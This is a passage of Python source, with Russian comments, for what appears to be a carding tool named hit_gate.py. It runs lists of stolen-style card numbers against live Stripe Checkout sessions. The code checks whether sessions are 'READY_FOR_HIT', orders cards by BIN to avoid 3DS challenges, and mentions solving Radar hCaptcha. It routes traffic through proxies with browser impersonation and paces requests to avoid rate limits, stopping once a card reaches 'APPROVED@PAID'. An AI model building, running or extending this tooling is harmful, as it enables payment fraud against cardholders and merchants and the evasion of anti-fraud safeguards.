    Поле называется session_status, а НЕ status: это состояние сессии Stripe ("open",
    "COMPLETE", "TEST_MODE", "INVALID_URL", "HTTP_400"...), а не вердикт карты. Раньше оно
    называлось status и в любом месте, прогнанном через config.coerce_verdict, давало
    UNKNOWN без возврата кредита (аудит 2026-09, G-10).
    """
    pk, cs = extract_session_and_key(target_url)
    if not pk.startswith("pk_live") or not cs.startswith("cs_"):
        return {
            "viable": False,
            "session_status": "INVALID_URL",
            "amount_cents": 0,
            "currency": "",
            "three_d_secure": "unknown",
            "three_ds_policy": "unknown",
            "recommendation": "FAIL: Не удалось декодировать pk/cs из fid-фрагмента или параметров URL (линк невалиден)",
            "details": {}
        }

    imp = config.pick_impersonate()
    norm_proxy = gc.normalize_proxy(proxy) if proxy else None
    try:
        async with AsyncSession(impersonate=imp, verify=False, proxy=norm_proxy) as s:
            pp_url = f"https://api.stripe.com/v1/payment_pages/{cs}"
            r = await s.get(pp_url,
                            params={"key": pk},
                            headers={"Origin": "https://js.stripe.com",
                                     "Referer": "https://js.stripe.com/",
                                     "Accept": "application/json"}, timeout=timeout)
            gc.flag_internal_endpoint(r, pp_url)
            if r.status_code != 200:
                return {
                    "viable": False,
                    "session_status": f"HTTP_{r.status_code}",
                    "amount_cents": 0,
                    "currency": "",
                    "three_d_secure": "unknown",
                    "three_ds_policy": "unknown",
                    "recommendation": f"FAIL: payment_pages вернул статус {r.status_code}",
                    "details": {"error_body": r.text[:200]}
                }
            data = r.json() or {}
            sess_status = data.get("status")
            livemode = data.get("livemode", True)
            is_sandbox = data.get("is_sandbox_merchant", False)

            pi = data.get("payment_intent") or {}
            pi_status = pi.get("status") or "hidden_subscription"
            amount = int(pi.get("amount") or ((data.get("total_summary") or {}).get("due")) or ((data.get("invoice") or {}).get("amount_due") if isinstance(data.get("invoice"), dict) else None) or 0)
            currency = str(pi.get("currency") or data.get("currency") or "").upper() or "USD"
            mode = str(data.get("mode") or ("subscription" if data.get("invoice") or data.get("subscription") else "payment"))

            pm_opts = pi.get("payment_method_options") or {}
            card_opts = pm_opts.get("card") or {}
            three_ds_req = card_opts.get("request_three_d_secure", "automatic")
            # Версия протокола 3DS: интент создаёт мерчант, поэтому выбираем её не мы — но
            # фиксировать фактическую обязаны. До этой правки версия не отражалась нигде
            # (аудит 2026-09, E-33), хотя Stripe принимает её явно в
            # payment_method_options.card.three_d_secure.version (clover/2026-01-28).
            _tds = card_opts.get("three_d_secure")
            three_ds_ver = str((_tds or {}).get("version") or "") if isinstance(_tds, dict) else ""
            three_ds_ver = three_ds_ver or "unknown"
            cust_country = str((data.get("customer") or {}).get("address", {}).get("country") or (data.get("tax_context") or {}).get("customer_tax_country") or "")

            if not livemode or is_sandbox:
                return {
                    "viable": False,
                    "session_status": "TEST_MODE",
                    "amount_cents": amount,
                    "currency": currency,
                    "three_d_secure": three_ds_req,
                    "three_ds_policy": three_ds_req,
                    "three_ds_version": three_ds_ver,
                    "pi_status": pi_status,
                    "mode": mode,
                    "recommendation": "SKIP: Мерчант в sandbox-режиме, реальные списания отключены",
                    "details": {"livemode": livemode, "is_sandbox": is_sandbox}
                }

            if sess_status in ("complete", "expired"):
                return {
                    "viable": False,
                    "session_status": str(sess_status).upper(),
                    "amount_cents": amount,
                    "currency": currency,
                    "three_d_secure": three_ds_req,
                    "three_ds_policy": three_ds_req,
                    "three_ds_version": three_ds_ver,
                    "pi_status": pi_status,
                    "mode": mode,
                    "recommendation": f"FAIL: Сессия уже {sess_status} (завершена или просрочена)",
                    "details": {"session_status": sess_status}
                }

            is_over_cap = amount > max_amount_cents if amount > 0 else False
            viable = (sess_status == "open") and (pi_status in ("requires_payment_method", "requires_action", "hidden_subscription")) and not is_over_cap

            if not viable and is_over_cap:
                rec = f"SKIP: Сумма {amount}{currency} выше допустимого лимита {max_amount_cents}c (CHARGE_RISK)"
            elif three_ds_req in ("any", "challenge_only"):
                rec = "WARN: Мерчант требует 3DS OTP на каждую транзакцию (enforced SCA)"
            elif viable:
                rec = f"READY_FOR_HIT: Доступно прямое списание ({mode}, {amount}{currency}, 3DS={three_ds_req})"
            else:
                rec = f"WARN: Нестандартный статус PaymentIntent: {pi_status}"

            return {
                "viable": viable,
                "session_status": sess_status,
                "pi_status": pi_status,
                "mode": mode,
                "amount_cents": amount,
                "currency": currency,
                "three_d_secure": three_ds_req,
                "three_ds_policy": three_ds_req,
                "three_ds_version": three_ds_ver,
                "is_over_cap": is_over_cap,
                "customer_country": cust_country,
                "recommendation": rec,
                "details": {
                    "pk": pk[:14] + "...",
                    "cs": cs[:14] + "...",
                    "init_checksum": bool(data.get("init_checksum")),
                }
            }
    except Exception as e:
        return {
            "viable": False,
            "session_status": "EXCEPTION",
            "amount_cents": 0,
            "currency": "",
            "three_d_secure": "unknown",
            "three_ds_policy": "unknown",
            "three_ds_version": "unknown",
            "recommendation": f"FAIL: Исключение при анализе сессии: {type(e).__name__}: {e}",
            "details": {"error": str(e)}
        }


HitGateSession = CsHitSession


async def execute_hit(target_url: str, cards: list, proxy: str | None = None,
                      use_ctoken: bool = False, challenge_solver: Any = None,
                      pacing: bool = False) -> dict:
    """Исполняет 5-шаговый автономный пайплайн /hit:
    1. Pre-flight Session Qualification
    2. Risk Suppression & BIN Steering
    3. Multi-Pass Confirmation (с поддержкой ctoken_... и автоматическим fallback к pm_...)
    4. Active In-Flight Challenge Resolution (Radar hCaptcha)
    5. Frictionless 3DS2 Traversal до терминального вердикта (APPROVED@PAID / DECLINED).
    """
    if not cards:
        probe = gc.gen_probe_card()
        cards = [f"{probe['number']}|{probe['mm']}|{probe['yy']}|{probe['cvc']}"]

    norm_proxy = gc.normalize_proxy(proxy) if proxy else None
    gs = CsHitSession(target_url, proxy=norm_proxy, use_ctoken=use_ctoken, challenge_solver=challenge_solver)
    ok, detail = await gs.open()
    if not ok:
        # status — таксономия (ERROR: сессия не открылась, это свойство цели), pipeline — FAILED.
        return {
            "status": "ERROR",
            "pipeline": "FAILED",
            "viable": False,
            "detail": f"open failed: {detail}",
            "results": [],
        }

    engine = bin_steering.BinSteeringEngine()
    # Живые данные о BIN от Stripe (бесплатно, по конкретной цели) — приоритетнее кэша таблиц.
    live_meta: dict = {}
    if getattr(gs, "s", None) is not None and getattr(gs, "pk", ""):
        try:
            live_meta = await gc.live_bin_metadata(gs.s, gs.pk, cards)
            if live_meta:
                _log.log_stripe("BIN_LIVE", gs.cs[:14], f"{len(live_meta)} BIN",
                                "данные Stripe edge-internal/card-metadata")
        except Exception as e:
            _log.log_stripe("BIN_LIVE", gs.cs[:14], "fallback", type(e).__name__)
    queue = await engine.split_queue(cards, live_meta=live_meta)
    ordered_cards = []
    for cat in (bin_steering.ThreeDsCategory.DIRECT_CHECKOUT,
                bin_steering.ThreeDsCategory.FRICTIONLESS_CANDIDATE,
                bin_steering.ThreeDsCategory.CHALLENGE_MANDATORY,
                bin_steering.ThreeDsCategory.INVALID):
        for p in queue[cat]:
            for orig in cards:
                if gc.extract_pan(orig) == p.pan and orig not in ordered_cards:
                    ordered_cards.append(orig)
                    break
    if not ordered_cards:
        ordered_cards = list(cards)

    results = []
    terminal_hit = None
    try:
        for i, c in enumerate(ordered_cards):
            t0 = time.perf_counter()
            res = await gs.check_card(c)
            lat = int((time.perf_counter() - t0) * 1000)
            st = str(res.get("status", "?"))
            res_item = dict(res)
            res_item["latency_ms"] = lat
            res_item["card"] = gc.mask_pan(c)
            results.append(res_item)
            if "APPROVED" in st or "PAID" in st:
                terminal_hit = res_item
                break
            if st in ("SESSION_EXPIRED", "SESSION_CANCELED"):
                break
            if i < len(ordered_cards) - 1:
                if pacing or st == "RATE_LIMITED":
                    await asyncio.sleep(config.session_pacing_delay())
                else:
                    await asyncio.sleep(1.5)
    finally:
        await gs.close()

    # status — только класс таксономии (его читают бот и CLI), состояние прогона — pipeline.
    # Раньше сюда писались SUCCESS/COMPLETED: через coerce_verdict они становились UNKNOWN,
    # то есть без возврата кредита (аудит 2026-09, G-10).
    # Итоговый статус — тот класс, который вернула поверхность. Раньше любой APPROVED* (включая
    # APPROVED@CVV и APPROVED@CCN — «карта жива», а не «оплачено») превращался в APPROVED@PAID,
    # и прогон на живой подписочной сессии отрапортовал победу при payment_status=unpaid
    # (живой замер 2026-09-12). Теперь «оплачено» — только фактическое подтверждение сессии.
    if terminal_hit:
        card_status = str(terminal_hit.get("status") or "")
        final_status = card_status if card_status in config.VERDICTS else config.coerce_verdict(card_status)
        paid = final_status == "APPROVED@PAID"
    else:
        final_status = config.coerce_verdict(str((results[-1].get("status") if results else "") or "ERROR"))
        paid = False
    last_pipeline = "SUCCESS" if terminal_hit else ("COMPLETED" if results else "FAILED")
    return {
        "status": final_status,
        "pipeline": last_pipeline,
        "viable": True,
        "paid": paid,
        "pi_id": gs.pi_id,
        "amount_cents": gs.amount,
        "currency": gs.currency,
        # Подтверждаем и считаем сумму в валюте витрины: у подписок она отличается от валюты PI.
        "confirmed_amount_cents": getattr(gs, "expected_amount", 0) or gs.amount,
        "confirmed_currency": gs.currency,
        "terminal_hit": terminal_hit,
        "results": results,
    }


async def main():
    args = sys.argv[1:]
    if "--help" in args or "-h" in args:
        print("Usage: python hit_gate.py <cs_live-checkout-url> [cards...|file] [--proxy URL] [--ctoken] [--pacing]")
        print("\nOptions:")
        print("  <cs_live-checkout-url>  Stripe Checkout Session URL (checkout.stripe.com/c/pay/cs_live_...#fid...)")
        print("  [cards...]              Card strings (PAN|MM|YY|CVV) or path to card file")
        print("  --proxy URL             Proxy URL (socks5:// or http://)")
        print("  --ctoken                Use ConfirmationToken (ctoken_...) flow instead of raw payment_method")
        print("  --pacing                Enforce 8.1s - 9.0s uniform jittered pacing between sequential cards")
        print("  -h, --help              Show this help message and exit")
        return

    proxy = None
    while "--proxy" in args:
        i = args.index("--proxy")
        if i + 1 < len(args):
            proxy = args[i + 1]
            del args[i:i + 2]
        else:
            del args[i]

    use_ctoken = False
    if "--ctoken" in args:
        args.remove("--ctoken")
        use_ctoken = True

    pacing = False
    if "--pacing" in args:
        args.remove("--pacing")
        pacing = True

    if not args:
        # Раньше CLI молча подставлял первую строку из data/hit_targets.txt — а весь тот пул
        # был мёртв (10/10 HTTP 400 checkout_not_active_session), поэтому дефолт гарантированно
        # вёл в провал и маскировал пустой пул (аудит 2026-09, G-02). Цель указывается явно.
        import os
        p_hit = os.path.join(os.path.dirname(__file__), "data", "hit_targets.txt")
        alive = 0
        if os.path.exists(p_hit):
            with open(p_hit, encoding="utf-8") as f:
                alive = sum(1 for line in f if line.strip().startswith("http"))
        print("Цель не указана, а дефолт из пула больше не подставляется.")
        print(f"[*] Боевых строк в data/hit_targets.txt: {alive}. "
              f"{'Пул пуст — цель нужно передать аргументом.' if alive == 0 else ''}")
        print("Usage: python hit_gate.py <cs_live-checkout-url> [cards...|file] [--proxy URL] [--ctoken] [--pacing]")
        raise SystemExit(2)

    target = args[0]
    cards = []
    import os
    for a in args[1:]:
        if os.path.exists(a):
            with open(a, encoding="utf-8") as f:
                cards += [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
        else:
            cards.append(a.strip())
    if not cards:
        probe = gc.gen_probe_card()
        cards = [f"{probe['number']}|{probe['mm']}|{probe['yy']}|{probe['cvc']}"]
        print(f"[*] карт нет — probe: {cards[0]}")
    print("=" * 80)
    print("[*] STRIPE CHECKOUT /hit GATE (cs_live hosted checkout)")
    print(f"[*] Target: {target.split('#')[0]}")
    print(f"[*] Cards: {len(cards)} | Proxy: {proxy or 'direct'} | CToken: {use_ctoken} | Pacing: {pacing}")

    # Предварительная оценка и приоритизация пула карт через BinSteeringEngine
    engine = bin_steering.BinSteeringEngine()
    # Живые данные о BIN (Stripe edge-internal/card-metadata) нужны ДО сортировки, а сессия
    # создаётся позже — поэтому берём pk из ссылки и ходим отдельным коротким соединением.
    live_meta = {}
    try:
        pk_cli, _cs_cli = extract_session_and_key(target)
        if pk_cli:
            async with AsyncSession(impersonate=config.pick_impersonate(), verify=False) as _s:
                live_meta = await gc.live_bin_metadata(_s, pk_cli, cards)
    except Exception:
        live_meta = {}
    if live_meta:
        print(f"[*] Живые данные о BIN от Stripe: {len(live_meta)} шт.")
    queue = await engine.split_queue(cards, live_meta=live_meta)
    _log.log_hit(f"BIN STEERING queue: {len(queue[bin_steering.ThreeDsCategory.DIRECT_CHECKOUT])} DIRECT_PASS | "
                 f"{len(queue[bin_steering.ThreeDsCategory.FRICTIONLESS_CANDIDATE])} FRICTIONLESS | "
                 f"{len(queue[bin_steering.ThreeDsCategory.CHALLENGE_MANDATORY])} CHALLENGE | "
                 f"{len(queue[bin_steering.ThreeDsCategory.INVALID])} INVALID")
    print("=" * 80)

    # Приоритетный порядок: DIRECT_CHECKOUT -> FRICTIONLESS -> CHALLENGE
    ordered_cards = []
    for cat in (bin_steering.ThreeDsCategory.DIRECT_CHECKOUT,
                bin_steering.ThreeDsCategory.FRICTIONLESS_CANDIDATE,
                bin_steering.ThreeDsCategory.CHALLENGE_MANDATORY,
                bin_steering.ThreeDsCategory.INVALID):
        for p in queue[cat]:
            for orig in cards:
                if gc.extract_pan(orig) == p.pan and orig not in ordered_cards:
                    ordered_cards.append(orig)
                    break
    cards = ordered_cards

    norm_proxy = gc.normalize_proxy(proxy) if proxy else None
    gs = CsHitSession(target, proxy=norm_proxy, use_ctoken=use_ctoken)
    ok, detail = await gs.open()
    if not ok:
        print(f"[x] open failed: {detail}")
        return
    print(f"[+] session: {gs.pi_id} | PI {gs.amount}{gs.currency} | подтверждаем "
          f"{gs.expected_amount or gs.amount}{gs.currency} (confirms: {gs.confirms}/{config.MAX_CONFIRMS_PER_SECRET})")
    try:
        for i, c in enumerate(cards):
            t0 = time.perf_counter()
            res = await gs.check_card(c)
            lat = int((time.perf_counter() - t0) * 1000)
            st = str(res.get("status", "?"))
            steer_tag = f"[{res.get('steering_category', '?')[:6]}]"
            conf = f"{res.get('confirmed_amount_cents')}{res.get('confirmed_currency')}"
            print(f">>> [{st:18}] {steer_tag:8} {gc.mask_pan(c)} ({lat}ms) подтверждено {conf} -> "
                  f"{res.get('detail', '')[:100]}", flush=True)
            _log.log_verdict("hit", gc.mask_pan(c), st,
                             detail=str(res.get("detail", ""))[:60], latency_ms=lat)
            if st in ("SESSION_EXPIRED", "SESSION_CANCELED"):
                print(f"[!] Сессия закрыта со стороны Stripe ({st}). Дальнейшие карты не проверяются, остановка очереди.")
                _log.log_hit(f"Session terminated by Stripe: {st}. Remaining cards aborted.")
                break
            if i < len(cards) - 1:
                if pacing or st == "RATE_LIMITED":
                    await asyncio.sleep(config.session_pacing_delay())
                else:
                    await asyncio.sleep(1.5)
    finally:
        await gs.close()


if __name__ == "__main__":
    asyncio.run(main())